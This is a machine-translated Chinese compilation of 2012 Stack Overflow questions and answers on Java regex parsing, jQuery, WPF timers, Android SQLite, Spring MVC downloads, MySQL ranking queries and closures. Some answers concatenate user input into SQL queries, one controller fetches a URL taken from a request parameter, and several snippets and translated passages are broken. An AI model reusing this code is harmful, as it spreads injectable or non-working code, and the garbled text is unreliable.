任何人都可以提供示例代码来说明他们将如何执行此操作吗？没有任何空格可以用作分隔符，而且我不完全理解正则表达式（我已经阅读了一堆教程，但它仍然没有点击）

* * *

编辑：

如果正则表达式是最好的选择，我只是很难理解如何创建一个合适的表达式。

我准备了以下代码：

```
String num = "5+2i";
String[] splitNum = num.split(); 
```

我试图弄清楚如何编写适当的正则表达式。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-06-12T05:43:45.213

## 备选方案 1

有点像这样呢？

```
String complexNum = "5+3i"; 
String regex = "(\\d+)[+-](\\d+)i";
Pattern pattern = Pattern.compile(regex);
Matcher matcher = pattern.matcher(complexNum);

if(matcher.find()){
   int real = Integer.parseInt(matcher.group(1));
   int imag = Integer.parseInt(matcher.group(2));
} 
```

如果您需要将符号作为数字的一部分，则将正则表达式更改为

```
String regex = "(\\d+)([+-]\\d+)i" 
```

这将使符号成为第二个匹配组的一部分。

## 备选方案 2

或者，如果您确定字符串格式正确并且您不关心虚部的唱法，您可以执行以下操作：

```
Scanner sc = new Scanner(complexNum).useDelimiter("[i+-]");
int real = sc.nextInt();
int imag = sc.nextInt(); 
```

哪个更简单。

## 备选方案 3

如果您不确定字符串的格式，您仍然可以使用正则表达式来验证它：

```
if(complexNum.matches("(\\d+)[+-](\\d+)i")) {
  //scanner code here
} else {
   //throw exception or handle the case
} 
```

## 备选方案 4

```
String[] tokens = complexNum.split("[i+-]");
int real = Integer.parseInt(tokens[0]);
int imag = Integer.parseInt(tokens[1]);
System.out.println(real +  " " + imag); 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-06-12T05:47:50.453

解析复数并不容易，因为 real 和 img 部分还可以包含符号和指数。您可以使用[apache-commons-math](http://commons.apache.org/math/userguide/complex.html)。

```
ComplexFormat cf = new ComplexFormat();
Complex c = cf.parse("1.110 + 2.222i"); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-12T05:48:59.240

试试这个 ：

```
 String complexNum = "5+3i"; 
    int j = 0 ;
    String real = getNumber();
    j++;
    String imag = getNumber();   

public String getNumber()
{
      String num ;
      char c;
      int temp;
      for( ; j < complexNum.length() ; j++)
       {
           c = complexNum.charAt(j);
           temp = (int) c;
           if(temp > 57 ||temp < 48)
                 break;
           else
                  num += c;
       }
     return num;
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-06-12T06:00:32.667

您的正则表达式应如下所示：`(\\d+)([-+])(\\d+)i`where`\\d+`将匹配任意数量的数字，`[+-]`将匹配 a`+`或 a `-`，并且`i`简单地匹配自身。`()`用于选择匹配的字符串部分。

改编自此链接的一些[代码](http://www.programmersheaven.com/2/RegexJAVA "这")：

```
 // Compile the patten.
Pattern p = Pattern.compile("(\\d+)([-+])(\\d+)i");

// Match it.
Matcher m = p.matcher(string);

// Get all matches.
while (m.find() == true)
    System.out.println("Real part " + m.group(1) +
                 " sign " m.group(2) +
         " and imagionary part " + m.group(3)); 
```

当然，这些仍然是字符串，所以你需要使用类似的东西

```
int real = Integer.parseInt(m.group(1)) 
```

将值转换为整数形式，您可以使用 if 语句来修复虚部上的符号，例如

```
if(m.group(2).equals("-"))
    imaginary *= -1;
    //if the value is positive, we don't have to multiply it by anything 
```

***更新：*** Edwin Dalorzo 上面的评论简化了这段代码。使用正则表达式`"(\\d+)([+-]\\d+)i"`来捕获虚部的符号，然后不需要任何`if`语句。

# javascript - 寻找一个可以解析```和```中的代码块的javascript markdown库

> ID：10991049
> 
> 赞同：6
> 
> 时间：2012-06-12T05:37:34.337
> 
> 标签：javascript, markdown

代码块的默认 markdown 语法是“每行缩进 4 个空格”。

但这对于长代码不是很方便，而是使用：

```
```
code block
``` 
```

会好很多。

我正在寻找一个具有此功能的 javascript markdown 库，您能推荐一些吗？

PS：我想要一个浏览器端的。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-06-12T05:46:17.337

[https://github.com/chjj/marked](https://github.com/chjj/marked)

它们被称为“栅栏”，是 github 风格的 Markdown 的一个功能。

# javascript - 使 jquery 手风琴默认关闭

> ID：10991050
> 
> 赞同：0
> 
> 时间：2012-06-12T05:37:34.360
> 
> 标签：javascript, jquery, jquery-ui

[http://jqueryui.com/demos/accordion/](http://jqueryui.com/demos/accordion/)

您可以`$('#itename').accordion('activate', 0)`关闭手风琴，但这会改变页面焦点，我不想这样做。`whatever.html#elementID`我可以将页面重新聚焦到顶部，但如果我正在设置焦点，那将不起作用。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-12T05:45:07.753

您需要设置`collapsible`为`true`和`active`。`false`

```
$( "#accordion" ).accordion({
    collapsible: true,
    active: false
}); 
```

**演示**：http: [//jsfiddle.net/z7Rhn/](http://jsfiddle.net/z7Rhn/)

阅读更多：http: [//jqueryui.com/demos/accordion/#collapsible](http://jqueryui.com/demos/accordion/#collapsible)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-12T05:47:46.180

可能这种方法会有用

编写一个函数来**改变**手风琴 ，它将做两件事：- 1.关闭手风琴。2.比编写代码来关注新元素

更改事件

```
$('.ui-accordion').bind('accordionchange', function(event, ui) {

}); 
```

# c# - 间隔为 0,0,1 的 DispatcherTimer 不完全是 1 秒？

> ID：10991051
> 
> 赞同：2
> 
> 时间：2012-06-12T05:37:50.173
> 
> 标签：c#, wpf, dispatchertimer

（使用 WPF）

在我编写的一个小应用程序中，我使用了一些倒数计时器。为此，我使用了`DispatcherTimer`.

```
counter01 = new DispatcherTimer();
counter01.Tick += new EventHandler(counter01_Tick);
counter01.Interval = new TimeSpan(0, 0, 1); 
```

但是现在当我测试/使用该程序时，我注意到当它设置为（例如）60 分钟倒计时时，与现实世界的时间相比，它会减少几分钟。

`DispatcherTimer`如果我像上面那样使用它，是否由于某种原因并不总是正好 1 秒？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-06-12T05:47:05.850

像这样的计时器永远不会绝对准确。毕竟，它必须在调度程序线程上运行——如果调度程序同时忙于处理其他线程，你会期望发生什么？

它可能足够接近以每秒大约一次*可见*`Stopwatch`的滴答声 - 您应该只取当前时间并从“目标”时间中减去它（或使用 a ）以获得相当准确的倒计时，而不是仅仅计数计时器计时的次数。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-06-12T05:54:21.643

MSDN 指出（关于`DispatcherTimer`）

> 定时器不能保证在时间间隔发生时准确执行，但可以保证在时间间隔发生之前不会执行。

对于每个`Tick`事件，计时器将关闭不确定的时间。1 小时（3600 滴答声），这将加起来。如果您将计时器间隔设置为 1 小时，我希望错误会少得多（尽管理论上，调度程序在一个滴答声中可能*非常忙，以至于错误**仍然大于*另一种情况）。

# macos - 从 Lion 上的客户端向 Windows 上的服务器发送消息

> ID：10991063
> 
> 赞同：0
> 
> 时间：2012-06-12T05:40:29.327
> 
> 标签：macos, delphi, client, osx-lion

我想将文本从我的 mac lion 主机发送到我在 vm 中运行的 windows 7 guest os。我确实在我的 Windows 7 上运行了一个客户端和一个服务器应用程序，因此它可以侦听消息。现在，如果我能让一个 mac 客户端向在我的 windows vm 上运行的服务器发送一条消息就好了。我想给我的 windows vm 发消息的原因是 windows 是我的主要开发平台。

谢谢，

本

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-12T10:51:43.380

您可以使用标准 RPC 通信。

潜在的技术是：

*   TCP/IP 数据包（Windows 和 Mac 都支持）；
*   HTTP 消息；
*   数据快照消息；
*   RemObjects 消息（符合您的需要，但价格昂贵）。

对于消息，更喜欢从 Mac 使用文本内容（例如使用 XML 或 JSON），然后您可以通过 RESTful 服务器提供内容，例如使用*Indy 。*因此 HTTP 是一个好主意。不要使用二进制格式，除非它在 ​​Mac 上是完全已知的。对于另一种实现可能性，您可以[使用 mORMot 的一些低级内容查看此示例代码](http://synopse.info/fossil/dir?name=SQLite3/Samples/13%20-%20StandAlone%20JSON%20SQL%20server)，包括快速 http.sys 服务器和来自数据库的 JSON 进程。

但是如果不知道应该如何编写您的 Mac 客户端（Delphi 2007 不允许为 Mac 编译），就不可能确定一个精确的解决方案。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-12T16:39:16.357

您可以使用 Lazarus IDE (Free Pascal) 为 Mac 编写客户端；该代码非常接近 Delphi 代码。您必须使用 Synapse 作为 http/tcp-ip 库。

# mono - IOS中RLE到UIImageView.Image的转换

> ID：10991067
> 
> 赞同：0
> 
> 时间：2012-06-12T05:41:23.347
> 
> 标签：mono, xamarin.ios, monodevelop

如何将 RLE 图像数据转换为 IOS 兼容的图像格式（IOS 支持）

```
ImgView.Image = UIImage.LoadFromData(_data) // _data contains of size 1350124 
```

_data 包含 RLE 格式的图像字节数组。而分配给 ImgView.Image 它得到

空值。所以图像不会显示在 UIImageView 上。

如何使 _data 格式与 UIImage 兼容

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-13T13:24:09.297

在实现 RLE 算法之后，我只在几行代码下面进行了长时间的斗争，最后我得到了解决方案

```
Byte _imgData = GetRawData(_imgPath);  // this method get the byte array of size ([131072]) 

NSData _data = NSData.FromArray(_imgData);

ImgView.Image = UIImage.LoadFromData(_data) 
int rawWidth = PixelData.ImageWidth;
int rawHeight = PixelData.ImageHeight;
float[] _rawSize = new float[rawWidth * rawHeight * 4];
for (int i =0; i < rawWidth * rawHeight; ++i) {
                _rawSize [4 * i] = (float)(1.0 / 255.0);
                _rawSize [4 * i + 1] = (float)(1.0 / 255.0);
                _rawSize [4 * i + 2] = (float)(1.0 / 255.0);
                _rawSize [4 * i + 3] = 255;
            }
int bitsPerComponant = 8;
int bitsPerPixel = 32;
int bytesPerRow = 4 * rawWidth;

CGDataProvider _provider = new CGDataProvider (_imgData, 0, _imgData.Length);
CGColorSpace colorSpace = CGColorSpace.CreateDeviceRGB ();

CGImage cg = new CGImage (
                rawWidth,
                rawHeight,
                bitsPerComponant,
                bitsPerPixel,
                bytesPerRow,
                colorSpace,
                CGBitmapFlags.ByteOrderDefault,
                _provider,
                null,
                true,
                CGColorRenderingIntent.Default
            );
ImgView.Image = UIImage.FromImage (cg); 
```

# java - jar 文件中的 Java 堆空间错误

> ID：10991071
> 
> 赞同：1
> 
> 时间：2012-06-12T05:41:47.010
> 
> 标签：java, swing, out-of-memory, heap-memory

我已经阅读了几篇关于 java heap space out of memory 错误的帖子。我正在使用 Java Swing 并收到错误“java heap space”。然后我尝试使用以下命令从命令提示符运行这个 jar：

```
java -Xmx128m -Xms128m -jar jedit.jar 
```

罐子运行得很好。但是现在的问题是，如何双击运行这个jar文件呢？我想我必须在`META-INF`. 但我不知道该写什么。谁能帮帮我吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-12T05:48:03.090

If you are thinking of providing VM parameters in the MANIFEST file, you cannot do that. That is not a possibility.

Rather you can use a executable wrapper which allows you to provide VM arguments and other startup parameters like [Launch4j](http://launch4j.sourceforge.net/index.html).

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-06-12T13:53:15.980

由于这是一个 Swing 应用程序，因此获得额外内存（以及一大堆其他好东西）的最佳途径是使用[Java Web Start](https://stackoverflow.com/tags/java-web-start/info)来部署它。

> JWS 提供了许多吸引人的功能，包括但不限于启动屏幕、桌面集成、文件关联、自动更新（包括延迟下载和更新的编程控制）、按平台、体系结构或 Java 版本、配置划分本地和其他资源下载运行时环境（最低 J2SE 版本、运行时选项、**RAM**等），使用扩展轻松管理公共资源。

* * *

JWS 提供了一种在基于 JNLP 的启动文件中指定内存要求的方法。因此，您可以提供具有不同内存分配的程序版本，使用相同的 Jar 但具有不同的启动文件。

# wpf - 什么是切换按钮，我们什么时候可以使用它？

> ID：10991073
> 
> 赞同：3
> 
> 时间：2012-06-12T05:41:58.587
> 
> 标签：wpf, c#-4.0, .net-4.0, toggle

这似乎是主要问题。但我搜索它，我找不到直接的答案。什么是切换按钮，普通按钮和切换按钮有什么区别？我们什么时候可以使用它？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-12T05:48:10.267

这是一个具有开和关状态的按钮。您可以从[MSDN 文档](http://msdn.microsoft.com/en-us/library/system.windows.controls.primitives.togglebutton.aspx#inheritanceContinued)中看到，它继承自与常规 Button 控件相同的类 (ButtonBase)。CheckBox 和 RadioButton 都继承自它。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-06-12T05:47:48.133

切换按钮意味着如果您需要在第一次单击时在按钮中使用两个选项（例如播放/停止）按钮，它将作为播放按钮工作，第二次作为停止按钮工作，这是切换按钮。

# php - simplehtmldom URL 提取和模式匹配

> ID：10991075
> 
> 赞同：0
> 
> 时间：2012-06-12T05:42:09.853
> 
> 标签：php, simple-html-dom

我有以下代码从给定的网址中提取所有超链接（网址）。

```
<?php include "simple_html_dom.php";

$html=new simple_html_dom();
$html->load_file('http://www.indiastudychannel.com/colleges');
$links=$html->find('a');

foreach($links as $l)
{

    $path='http://www.indiastudychannel.com/colleges'.$l->href;
    //doScrape($path);
    echo $path."<br>";
}
?> 
```

上面的代码提取了所有超链接，但我只想提取具有以下模式的链接。

[http://www.indiastudychannel.com/colleges/54499-Godavari-College-Nursing.aspx](http://www.indiastudychannel.com/colleges/54499-Godavari-College-Nursing.aspx) http://www.indiastudychannel.com/colleges/54489-Rvs-College-Arts-And-Science.aspx [http:// www.indiastudychannel.com/colleges/54488-Sankara-Institute-Management.aspx](http://www.indiastudychannel.com/colleges/54488-Sankara-Institute-Management.aspx)

我知道这可以使用正则表达式来完成，但我不知道具体如何。请举个例子，让我很容易理解。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-12T08:15:58.083

尝试

```
preg_match("/^http://www.indiastudychannel.com/colleges/54489/\"); 
```

看一眼

[http://php.net/manual/en/function.preg-match.php](http://php.net/manual/en/function.preg-match.php)

和

[http://weblogtoolscollection.com/regex/regex.php](http://weblogtoolscollection.com/regex/regex.php)

# android - 我在安卓模拟器上的应用在哪里？我正在使用 Eclipse/ADT

> ID：10991078
> 
> 赞同：0
> 
> 时间：2012-06-12T05:42:27.320
> 
> 标签：android, android-emulator, adt

我有点坚持一些android开发。我正在使用 Eclipse/ADT 并创建了一个 2 活动项目测试。
![在此处输入图像描述](../Images/c70a3a55a5cb344de61ddb82605c3a6b.png)

一切构建和模拟器都开始了，但我看不到我的应用程序。

![在此处输入图像描述](../Images/8218964e3acc67bb66d477921ce112c8.png)

我对此很陌生，可能会遗漏一些明显的东西。知道在哪里可以在模拟器上看到我的应用程序吗？

* * *

## 编辑

滑动工作，我设法到达测试应用程序（项目名称测试，所以我猜相同的应用程序名称）但我在屏幕上得到关注。 ![在此处输入图像描述](../Images/e0592088088da78fda5ead57e0ce0086.png)

我期望，一个按钮和一些其他的东西，因为我的 main.xml 如下。

```
<TextView
    android:id="@+id/textView1"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:text="I&apos;m screen 1 (main.xml)"
    android:textAppearance="?android:attr/textAppearanceLarge" />

<Button
    android:id="@+id/button1"
    android:layout_width="fill_parent"
    android:layout_height="wrap_content"
    android:text="Click me to another screen" /> 
```

肯定是我的一些错误，不知道是什么？

我的清单。

```
<uses-sdk android:minSdkVersion="10" />

<application
    android:icon="@drawable/ic_launcher"
    android:label="@string/app_name" >
    <activity
        android:label="@string/app_name"
        android:name=".AppActivity" >
        <intent-filter >
            <action android:name="android.intent.action.MAIN" />
            <category android:name="android.intent.category.LAUNCHER" />
        </intent-filter>
    </activity>
    <activity
        android:label="@string/app_name"
        android:name=".App2Activity" >
    </activity>
</application> 
```

我的 main.xml 文件如下。

```
<TextView
    android:id="@+id/textView1"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:text="I&apos;m screen 1 (main.xml)"
    android:textAppearance="?android:attr/textAppearanceLarge" />

<Button
    android:id="@+id/button1"
    android:layout_width="fill_parent"
    android:layout_height="wrap_content"
    android:text="Click me to another screen" /> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-12T06:01:38.600

由于您的应用名称是`Test`，它肯定在 screen2 中。

只需从左向右滑动（拖动）屏幕，您就应该得到它。

希望能帮助到你 ！！！

# css - Bootstrap Modal 位于 Chrome 中的背景后面

> ID：10991085
> 
> 赞同：7
> 
> 时间：2012-06-12T05:43:09.697
> 
> 标签：css, google-chrome, twitter-bootstrap, modal-dialog

我正在使用 Twitter Bootstrap（CSS 和 JS）。

问题来自于 Modal 插件，它在 Firefox 和 IE 上运行良好，但在 Chrome 中显示不佳：Modal 成功弹出，但隐藏在 modal-backdrop 后面。这意味着无法填写表格或查看模态框中包含的文本。

它似乎在 Bootstrap 网站（[http://twitter.github.com/bootstrap/javascript.html#modals](http://twitter.github.com/bootstrap/javascript.html#modals)）上运行良好，所以我认为它可能与 Chrome 的一个已知错误有关？

我已经搜索了一个没有成功的解决方案。我没有修改任何 Bootstrap CSS 或 JS。

我错过了什么？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-06-12T07:08:27.123

中的样式`-webkit-overflow-scrolling: touch;`导致`section#maincontainer`这种情况发生，因为它似乎与`overflow: auto`.

我相信这`-webkit-overflow-scrolling: touch;`应该用于在使用固定定位的元素中提供触摸屏滚动溢出 - 所以我认为你不需要将它应用到`section#maincontainer`.

但是，您可能希望将其应用于`modal-body`父级使用固定定位并且内容可能会溢出。

**[http://css-tricks.com/mobile-webkit-overflow-scrolling/](http://css-tricks.com/mobile-webkit-overflow-scrolling/)**

# java - 如何使用 Spring MVC 从 url 下载文件？

> ID：10991089
> 
> 赞同：2
> 
> 时间：2012-06-12T05:43:28.937
> 
> 标签：java, jsp, spring-mvc, download

我的jsp中有这样的下载选项

```
<a href='<c:url value="/licensing/download.sp?name=${namelist.name}&downloadUrl=${namelist.url}"/>'>

<img src="/images/download.gif" alt="Download" border="0" align="right"> 
```

在上面的“url”是文件的位置，名称是文件名。点击jsp iam中的下载选项，调用控制器方法下载，在控制器中

```
public ModelAndView download(HttpServletRequest request, HttpServletResponse response, DevTechBean devTechBean) throws Exception {
        cat.debug("MySuiteListController: download: begin");
        ModelAndView modelView = super.handleLicensingRequest(request, response);
        String name = request.getParameter("name");

        String url1 = request.getParameter("downloadUrl");
        cat.debug(" download: url ="+url1);

        String downloadurl1="https://my.net:8869"+url1;
        cat.debug(" download: downloadurl ="+downloadurl1);
    try{
        URL url = new URL(downloadurl1);  
        //response.setHeader("Content-Type", "text/csv");  
        response.setHeader("Content-disposition", "attachment;filename="+name);
        URLConnection connection = url.openConnection();
        InputStream stream = connection.getInputStream();
        BufferedOutputStream outs = new BufferedOutputStream(response.getOutputStream());
        int len;
        byte[] buf = new byte[1024];
        while ((len = stream.read(buf)) > 0) {
          outs.write(buf, 0, len);
        }
        outs.close();
    }
    catch (MalformedURLException e) { 
        cat.error("Error occurrred in url");

    } 
    catch (IOException e) { 
        cat.error("Error occurrred ");

    }
        String viewName = "swl_download";
    modelView.setViewName(viewName);
return modelView;       

} 
```

但是当我点击下载时，我得到文件未找到异常。我认为这个问题是由于 url 值。在上面的 iam 中，值为 downloadurl=/files/download/hai.txt

当我给

```
<a href="${namelist.url}"/>
<img src="/images/download.gif" alt="Download" border="0" align="right"></a><br/><br/></td> 
```

单击时，文件将在浏览器中打开，网址为[https://my.net:8869//files/download/hai.txt](https://my.net:8869//files/download/hai.txt(but) （但此处为 href iam 仅提供此链接“/files/download/hai.txt”不知道整个链接是怎么来的。

但是如果给出这样的链接来调用控制器以打开该文件作为弹出窗口。

```
<a href='<c:url value="/download.sp?name=${namelist.name}&downloadUrl=${namelist.url}"/>'> 
```

它正在获取文件未找到异常。我认为这是由于做downloadUrl.so我在上面添加了这样的

```
String downloadurl1="https://my.net:8869"+url1; 
```

但我得到文件找不到异常。请帮我解决这个问题。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-06-27T14:32:03.960

Try this:

```
@RequestMapping(value="/viewAttach", method = RequestMethod.GET)
public ModelAndView viewAttach(@RequestParam(value="article_id", required = true) String article_ref, HttpSession session, HttpServletResponse response) 
{

    /* *** Check Session *** */
    try {

        // Direclty from pier.content.GetContent written by ang94402

        URL url = new URL(binaryURL);           
        response.setHeader("Content-disposition", "attachment;filename=" + binary.getName());

        //Set the mime type for the response
        response.setContentType("application/pdf");

        // URLConnection connection = url.openConnection();
        InputStream is = url.openStream();

        BufferedOutputStream outs = new BufferedOutputStream(response.getOutputStream());
        int len;
        byte[] buf = new byte[1024];
        while ( (len = is.read(buf)) > 0 ) {
            outs.write(buf, 0, len);
        }
        outs.close();

    } catch (MalformedURLException e) {
        logger.error("Error ModelAndView.viewMain - MalformedURLException : " + e.toString() + " -- " + e.getStackTrace()[0].toString());
        return null;
    } catch (IOException e) {
        logger.error("Error ModelAndView.viewMain - IOException : " + e.toString() + " -- " + e.getStackTrace()[0].toString());
        return null;
    }

    return null;

} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-12T06:43:27.093

这只是一个伪代码。根据您的需要更改它。

```
 InputStream is = getClass().getResourceAsStream("filename"); 
```

首先尝试找出 getClass() 指向哪个目录。（不确定，但它应该是您的应用程序的 HOME ？）。然后将您的文件放在相同的位置，如果不是。

希望这会有所帮助。 [资源](http://www.java2s.com/Code/Java/Development-Class/getClassgetResourceAsStream.htm)

# android - 尝试查找 sqlite 数据库中是否存在值时出错

> ID：10991091
> 
> 赞同：0
> 
> 时间：2012-06-12T05:44:04.033
> 
> 标签：android, sqlite

我是使用 SQLite 数据库和 android 移动开发的新手。我正在尝试检查数据库中是否存在编辑文本字段输入的用户名。当我运行它并单击一个按钮时，应用程序崩溃了。这是我的代码。

```
 public boolean findUsername(String username) {
Cursor c = ourDatabase.query(true, DATABASE_TABLE_L, new String[] {
        KEY_USERID, KEY_USERNAME, KEY_PASSWORD,KEY_SECRETQ,KEY_ANSWER}, KEY_USERNAME + "="
        + username, null, null, null, null, null);
    if (c != null) {
      return true;
      }
      return false;
  }
} 
```

来自日志 cat 的错误指出：

```
no such column: bobby: , while compiling: SELECT DISTINCT userId, username, password,    secretQ, answer FROM Login WHERE username=bobby 
```

我究竟做错了什么？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-12T05:47:57.743

你应该像这样形成你的查询

```
SELECT DISTINCT userId, username, password,    secretQ, answer FROM Login WHERE username='bobby' 
```

您必须为用户名加上引号。

```
Cursor c = ourDatabase.query(true, DATABASE_TABLE_L, new String[] {
        KEY_USERID, KEY_USERNAME, KEY_PASSWORD,KEY_SECRETQ,KEY_ANSWER}, KEY_USERNAME + "='"
        + username +"'", null, null, null, null, null); 
```

上面试试。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-06-12T05:48:59.630

```
Cursor c = ourDatabase.query(true, DATABASE_TABLE_L, new String[] {
        KEY_USERID, KEY_USERNAME, KEY_PASSWORD,KEY_SECRETQ,KEY_ANSWER}, KEY_USERNAME + "=?",
        username, null, null, null, null); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-06-12T05:53:47.950

试试这个。

```
Cursor C = ourDatabase.query(DATABASE_TABLE_L, new String[] {
        KEY_USERID}, KEY_USERNAME + "= ?" , new String[] {username}, null, null,null); 
```

# php - PHP：如何知道 PostgreSQL 持久连接是否已经打开？

> ID：10991095
> 
> 赞同：2
> 
> 时间：2012-06-12T05:44:21.750
> 
> 标签：php, postgresql, persistent-connection

根据 PHP.net 手册，pg_pconnect 将创建一个持久连接，或者如果它已经存在并且具有相同的连接字符串，则返回现有的连接。

我遇到的问题是我想知道该调用是否确实创建了一个连接或实际上返回了相同的连接，例如，在它是第一个连接的情况下加载准备好的语句。

真的有可能吗？

更新：关于这个问题，我不是指当前正在运行的 PHP 脚本。我想知道连接是否已在*某个时候*打开（可能是其他脚本再次打开）或者这个脚本是第一个打开该连接的脚本（例如，因为我重置了 PostgreSQL 服务器）。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-12T05:57:00.460

检查手册。解决方案在其描述中给出。如果您启用了持久连接，它将返回现有连接，这是默认启用的。根据我的经验，我对此没有任何问题。希望这会有所帮助。[pg_pconnect() 的 php.net 手册](http://www.php.net/manual/en/function.pg-pconnect.php)

答案更新：我应该补充一点，通常 postgres 对其连接非常有把握；即使您重置服务，它也会尝试保留连接；因此，明智的做法是不要使用“检查预先存在的连接”这个事件，因为即使您找到了检测新连接返回事件的机制，它也可以用手指计算；很少很少。

我认为你应该改变你的逻辑。

# mysql - 使用 MySQL ORDER BY 选择范围

> ID：10991099
> 
> 赞同：2
> 
> 时间：2012-06-12T05:44:57.983
> 
> 标签：mysql, sql-order-by

所以我有这个游戏数据库，我有几个用户，他们有字段，id，name，points

我需要一个特定用户的排名表，可以看到它的位置与点数的关系，表中有 8 个位置的空间，所以我正在寻找一种方法来执行以下操作：

如果我`SELECT * FROM users WHERE id = {user_id} ORDER By points`选择之前的 4 个结果和之后的 3 个结果。有查询吗？结果应如下所示：

```
---------------------
|id   |name  |points|
---------------------
| 52  |name1 | 10   |
---------------------
| 23  |name1 | 09   |
---------------------
| 93  |name1 | 08   |
---------------------
| 12  |name1 | 07   |
---------------------
| 43  |queried_name1 | 06   |
---------------------
| 67  |name1 | 05   |
---------------------
| 32  |name1 | 04   |
---------------------
| 91  |name1 | 03   |
--------------------- 
```

我试图通过软件来实现这一点，但迭代所有结果的速度非常慢。谢谢你的帮助！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-12T05:54:13.407

就像这样，我会说，对于上述结果：

```
SELECT * FROM users WHERE points > (SELECT points FROM users WHERE id = {user_id}) ORDER By points ASC LIMIT 3; 
```

对于以下结果：

```
SELECT * FROM users WHERE points < (SELECT points FROM users WHERE id = {user_id}) ORDER By points DESC LIMIT 4; 
```

所以，有了一个大联盟，它会给出：

```
SELECT * FROM (SELECT * FROM users WHERE points > (SELECT points FROM users WHERE id = {user_id}) ORDER By points ASC LIMIT 3 ) a 
UNION
SELECT * FROM users WHERE id = {user_id}
UNION
SELECT * FROM (    SELECT * FROM users WHERE points < (SELECT points FROM users WHERE id = {user_id}) ORDER By points DESC LIMIT 4 ) b 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-12T06:06:19.043

您可以使用此查询 -

```
SELECT id, name, points FROM (
  SELECT u.*, @r:=@r+1 rank, @pos:=IF(@pos = 0 AND name = 'queried_name1', @r, @pos)
    FROM users u,
    (SELECT @r:=0, @pos:=0) t
  ORDER BY points DESC
  ) t
WHERE rank BETWEEN @pos - 4 AND @pos + 3 
```

它按点对表进行排序，找到 name = 'queried_name1' 的记录，并选择找到的记录之前和之后的一些行。

# closures - 我们可以有没有内部函数的闭包吗？

> ID：10991100
> 
> 赞同：0
> 
> 时间：2012-06-12T05:44:59.793
> 
> 标签：closures

闭包是一个外部函数 O，它的主体中有一个变量 x 和一个内部函数 F。F 必须访问 x。O 必须返回 F，即 F 本身（或其指针），而不是 F 的返回值。这样由于 F 可以从 O 外部的代码中调用，并且 F 需要执行 x，x 必须保持在作用域之后O出口。

在 javascript 中，我们可以在函数中定义函数，所以它很简单。在 C# 中，我们必须使用匿名方法或匿名委托才能具有与内部函数相同的行为。

闭包的本质是在函数退出后保留函数局部变量的值，以便下次调用函数时，先前的值已经存在。上面提到的语法和技术是完成闭包的方法。

无论如何，在不使用内部函数或委托的情况下，是否有任何语言（汇编语言除外）具有闭包的本质。当然，OOP 中的类中的字段具有相同的效果，但我正在寻找除此之外的方法。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-12T18:20:07.960

根据定义，闭包在其词法范围内关闭变量。如果它不能“内在”于其他带有局部变量的东西，那将是完全没用的。所以几乎一个闭包必须能够在某个函数内部。

然而，一种复杂性是某些语言中的闭包与匿名函数密切相关。（匿名函数通常必须是闭包；闭包不必是匿名函数，但在某些语言中，唯一的闭包是匿名函数。）匿名函数的语法可能不同于常规（命名）函数的语法（尤其是在具有函数和变量的单独命名空间；命名函数将在函数命名空间中，但匿名函数将是数据）。在其中一些语言中，没有“内部”命名函数。

例如，在 PHP 中，所有命名函数都在全局范围内。将命名函数定义放入另一个（违反直觉）在外部函数运行时定义全局范围内的内部函数（外部代码可以看到它）（好像它是在外部范围中声明的，但延迟了）。然而，PHP 5.3+ 也有匿名函数，它们是闭包；人们通常将匿名函数称为“闭包”，因为它们是该语言中唯一的闭包。

另一个例子是Ruby。`def`语法定义了一个方法。在另一个方法中定义一个方法（违反直觉）仍然将该方法定义为对其他方法可见。Ruby 也有匿名函数，它们是闭包，使用`lambda`,`proc`或`Proc.new`语法，但它们在语法上是不同的。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-14T14:48:14.120

我不会称它们为闭包，但局部变量保持状态的概念在 VB 中是带有`Static`局部变量的。

```
Sub Example()
  Dim normalVar As Integer
  Static staticVar As Integer

  normalVar += 1
  staticVar += 1

  Console.WriteLine("{0} {1}", normalVar, staticVar)
End Sub 
```

（这是 VB.NET，但`Static`在 VB3 或更早版本中。）

这将输出

```
1 1
1 2
1 3 
```

如果叫了三遍。

# objective-c - 访问 iOS 上的最近通话

> ID：10991107
> 
> 赞同：1
> 
> 时间：2012-06-12T05:45:19.477
> 
> 标签：objective-c, ios, xcode, addressbook

是否有任何合法的方式可以通过代码访问 iPhone 上的最近通话（通话记录）？我看到了一些选项，但他们说苹果不会接受。

谢谢你的帮助！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-12T05:54:51.380

您可以通过未记录的 API 访问调用历史记录，但您将无法在 appstore 上发布您的应用程序，因为苹果不允许/批准任何使用未记录 API 的应用程序

# linux - 64 位 Linux 机器中最大可能的共享内存大小

> ID：10991111
> 
> 赞同：2
> 
> 时间：2012-06-12T05:45:47.283
> 
> 标签：linux, 64-bit, shared-memory

